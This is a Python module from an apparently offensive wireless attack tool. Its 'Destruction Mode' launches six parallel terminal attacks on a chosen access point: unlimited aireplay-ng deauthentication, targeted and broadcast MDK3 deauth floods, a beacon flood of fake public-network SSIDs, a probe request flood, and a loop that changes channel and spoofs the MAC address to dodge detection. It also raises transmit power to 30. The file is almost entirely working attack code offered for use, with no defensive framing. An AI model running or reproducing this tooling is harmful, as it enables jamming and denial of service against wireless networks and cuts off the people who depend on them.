"""
Destruction Mode - Multi-terminal attack module
"""

import subprocess
import threading
import time
import os
import random
import signal
from typing import Optional, Dict, List
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Confirm, Prompt

from src.logger import get_logger

console = Console()
logger = get_logger(__name__)

class DestructionMode:
    """Multi-terminal attack mode - Maximum destruction"""
    
    def __init__(self, interface: str, config: Dict):
        self.interface = interface
        self.config = config
        self.target_bssid = None
        self.channel = None
        self.running = False
        self.terminals = []
        self.attack_processes = []
        
    def launch_destruction(self, target_bssid: str, channel: int):
        """Launch destruction mode with multiple terminals"""
        self.target_bssid = target_bssid
        self.channel = channel
        self.running = True
        
        console.print()
        console.print(Panel(
            "[red]💀 DESTRUCTION MODE ACTIVATED[/red]\n"
            "[yellow]This will open 6 terminals running simultaneous attacks[/yellow]\n"
            "[red]Target: {} | Channel: {}[/red]".format(target_bssid, channel),
            border_style="red"
        ))
        
        if not Confirm.ask("[red]Are you sure you want to proceed? THIS IS EXTREME![/red]"):
            return
            
        console.print("[yellow]Launching destruction terminals...[/yellow]")
        
        # Launch all attacks
        self._launch_terminal_1(target_bssid, channel)
        self._launch_terminal_2(target_bssid, channel)
        self._launch_terminal_3(target_bssid, channel)
        self._launch_terminal_4(target_bssid, channel)
        self._launch_terminal_5(target_bssid, channel)
        self._launch_terminal_6(target_bssid, channel)
        
        console.print("[green]✓ All 6 destruction terminals launched![/green]")
        console.print("[yellow]⚠️  Check the terminals - they're running simultaneously[/yellow]")
        console.print("[dim]Press any key to stop all attacks...[/dim]")
        
        input()
        self.stop_destruction()
        
    def _launch_terminal(self, title: str, command: str, color: str = "red"):
        """Launch a single terminal with attack"""
        try:
            # Check if xterm is installed
            subprocess.run(["which", "xterm"], check=True, capture_output=True)
            
            # Launch xterm with the command
            cmd = [
                "xterm",
                "-title", title,
                "-bg", "black",
                "-fg", color,
                "-geometry", "80x24",
                "-e", "bash", "-c",
                "echo '{}'; echo '========================================'; {}; read -p 'Press Enter to exit...'".format(
                    title, command
                )
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            
            self.terminals.append(process)
            return process
            
        except subprocess.CalledProcessError:
            # xterm not found, try gnome-terminal
            try:
                cmd = [
                    "gnome-terminal",
                    "--title", title,
                    "--", "bash", "-c",
                    "echo '{}'; echo '========================================'; {}; read -p 'Press Enter to exit...'".format(
                        title, command
                    )
                ]
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True
                )
                self.terminals.append(process)
                return process
            except:
                console.print("[red]✗ No terminal emulator found! Install xterm: sudo apt install xterm[/red]")
                return None
        except Exception as e:
            logger.error(f"Error launching terminal: {e}")
            return None
    
    def _launch_terminal_1(self, bssid: str, channel: int):
        """Terminal 1: Aireplay deauth flood"""
        cmd = f"""
sudo airmon-ng check kill 2>/dev/null
sudo iwconfig {self.interface} txpower 30
sudo iwconfig {self.interface} channel {channel}
echo "🔥 TERMINAL 1: AIREPLAY DEAUTH FLOOD"
echo "Target: {bssid} | Channel: {channel}"
echo "========================================"
sudo aireplay-ng --deauth 0 -a {bssid} {self.interface}
"""
        self._launch_terminal("🔥 T1: Aireplay Deauth", cmd, "red")
        
    def _launch_terminal_2(self, bssid: str, channel: int):
        """Terminal 2: MDK3 deauth"""
        cmd = f"""
sudo iwconfig {self.interface} txpower 30
sudo iwconfig {self.interface} channel {channel}
echo "💀 TERMINAL 2: MDK3 DEAUTH"
echo "Target: {bssid} | Channel: {channel}"
echo "========================================"
sudo mdk3 {self.interface} d -c {channel} -m {bssid} -s 20 -r 7
"""
        self._launch_terminal("💀 T2: MDK3 Deauth", cmd, "red")
        
    def _launch_terminal_3(self, bssid: str, channel: int):
        """Terminal 3: Broadcast deauth"""
        cmd = f"""
sudo iwconfig {self.interface} txpower 30
sudo iwconfig {self.interface} channel {channel}
echo "📡 TERMINAL 3: BROADCAST DEAUTH"
echo "Channel: {channel} (ALL CLIENTS)"
echo "========================================"
sudo mdk3 {self.interface} d -c {channel} -b -s 25
"""
        self._launch_terminal("📡 T3: Broadcast Deauth", cmd, "orange")
        
    def _launch_terminal_4(self, bssid: str, channel: int):
        """Terminal 4: Beacon flood"""
        cmd = f"""
sudo iwconfig {self.interface} txpower 30
sudo iwconfig {self.interface} channel {channel}
echo "🏴‍☠️ TERMINAL 4: BEACON FLOOD"
echo "Channel: {channel}"
echo "========================================"
sudo mdk3 {self.interface} b -c {channel} -f /tmp/ssids.txt -s 100
"""
        # Create SSID list
        ssids = ["FREE_WIFI", "PUBLIC_WIFI", "HOTEL_WIFI", "CAFE_WIFI", "5G_WIFI", 
                 "AIRPORT_WIFI", "STARBUCKS_WIFI", "MCDONALDS_WIFI", "FREE_INTERNET"]
        with open("/tmp/ssids.txt", "w") as f:
            f.write("\n".join(ssids))
            
        self._launch_terminal("🏴‍☠️ T4: Beacon Flood", cmd, "yellow")
        
    def _launch_terminal_5(self, bssid: str, channel: int):
        """Terminal 5: Probe request flood"""
        cmd = f"""
sudo iwconfig {self.interface} txpower 30
sudo iwconfig {self.interface} channel {channel}
echo "🎯 TERMINAL 5: PROBE REQUEST FLOOD"
echo "Target: {bssid} | Channel: {channel}"
echo "========================================"
sudo mdk3 {self.interface} p -c {channel} -t {bssid} -s 50
"""
        self._launch_terminal("🎯 T5: Probe Flood", cmd, "magenta")
        
    def _launch_terminal_6(self, bssid: str, channel: int):
        """Terminal 6: Channel hopper + MAC spoofer"""
        cmd = f"""
echo "🔄 TERMINAL 6: CHANNEL HOPPER + MAC SPOOFER"
echo "========================================"
while true; do
    # Random MAC
    sudo ip link set {self.interface} down 2>/dev/null
    sudo macchanger -r {self.interface} 2>/dev/null
    sudo ip link set {self.interface} up 2>/dev/null
    
    # Random channel
    CHAN=$(shuf -i 1-11 -n 1)
    sudo iwconfig {self.interface} channel $CHAN 2>/dev/null
    echo "[+] MAC changed | Channel: $CHAN"
    
    sleep 3
done
"""
        self._launch_terminal("🔄 T6: Hopper/Spoofer", cmd, "cyan")
        
    def stop_destruction(self):
        """Stop all destruction attacks"""
        console.print("[yellow]Stopping all destruction attacks...[/yellow]")
        
        # Kill all attack processes
        for proc in self.attack_processes:
            try:
                proc.terminate()
            except:
                pass
                
        # Kill xterm windows
        try:
            subprocess.run(["pkill", "-f", "xterm"], capture_output=True)
        except:
            pass
            
        try:
            subprocess.run(["pkill", "-f", "gnome-terminal"], capture_output=True)
        except:
            pass
            
        # Kill all attack tools
        subprocess.run(["sudo", "pkill", "-f", "aireplay-ng"], capture_output=True)
        subprocess.run(["sudo", "pkill", "-f", "mdk3"], capture_output=True)
        
        console.print("[green]✓ All destruction attacks stopped[/green]")
        self.running = False
